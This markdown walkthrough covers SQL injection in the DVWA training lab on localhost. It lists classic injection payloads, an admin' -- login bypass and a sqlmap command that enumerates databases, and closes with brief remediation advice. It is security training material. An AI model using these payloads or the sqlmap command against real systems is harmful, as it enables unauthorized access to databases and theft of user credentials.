`DVWA-SQLi-Walkthrough.md` – SQL injection test case with payloads and output

 DVWA-SQLi-Walkthrough.md
```markdown
# 🔍 DVWA SQL Injection Walkthrough

 🔧 Environment
- **Application**: Damn Vulnerable Web Application (DVWA)
- **Security Level**: Low
- **Tool**: Burp Suite, Firefox, SQLMap (optional)

 🎯 Objective
Exploit SQL Injection in the login page and extract user credentials.

---

 🧪 Steps

 1. Navigate to the SQL Injection module in DVWA:
```
http://localhost/dvwa/vulnerabilities/sqli/
```

### 2. Interact with the input field:
Input: `1' OR '1'='1`

Submit → Observe that all users are displayed — indicating **SQLi exists**.

---

 🧰 Useful Payloads
```sql
1' OR '1'='1 -- 
1' OR '1'='1' #
' OR 1=1--
admin' --
' OR '' = '
```

---

🔐 Authentication Bypass Example
Input in login:
- Username: `admin' -- `
- Password: `anything`

Login successful. This proves SQLi can bypass login authentication.

---

 🧪 Automate with SQLMap
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xyz" --dbs
```

- `--dbs`: enumerate all databases
- `--tables -D dvwa`: list all tables in DVWA database

---

 ✅ Remediation
- Use prepared statements (e.g., PDO in PHP)
- Validate and sanitize inputs
- Employ WAF and least-privilege database roles
  
